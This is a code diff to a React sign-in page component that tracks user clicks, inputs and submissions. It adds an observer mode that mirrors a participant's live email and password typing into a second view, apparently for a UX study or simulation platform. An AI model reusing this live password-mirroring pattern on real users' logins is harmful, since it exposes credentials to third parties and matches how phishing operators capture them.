@@ -1,5 +1,5 @@
 import { createFileRoute } from "@tanstack/react-router";
-import { useCallback, useState } from "react";
+import { useCallback, useEffect, useState } from "react";
 import {
   CbFontStyle,
   CbLogo,
@@ -77,13 +77,33 @@ function AvatarPlaceholder({ email }: { email: string }) {
 }
 
 function CbSignInPage() {
-  const { trackClick, trackInput, trackSubmit, cbNavigate, sessionId } = useCbTracking();
+  const { trackClick, trackInput, trackSubmit, cbNavigate, sessionId, isObserve } = useCbTracking();
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [step, setStep] = useState<1 | 2>(1);
   const [showPassword, setShowPassword] = useState(false);
   const [continueLoading, setContinueLoading] = useState(false);
   const [loadingBtn, setLoadingBtn] = useState<string | null>(null);
+
+  // Keep observe iframe React state in sync with participant live typing.
+  useEffect(() => {
+    if (!isObserve) return;
+    function onMirror(e: Event) {
+      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
+      if (!d?.field) return;
+      const value = String(d.value ?? "");
+      if (d.field === "email") {
+        setEmail(value);
+        return;
+      }
+      if (d.field === "password") {
+        setStep(2);
+        setPassword(value);
+      }
+    }
+    window.addEventListener("ux:mirror-live-input", onMirror);
+    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
+  }, [isObserve]);
 
   const isValidEmail = useCallback(
     (v: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v),
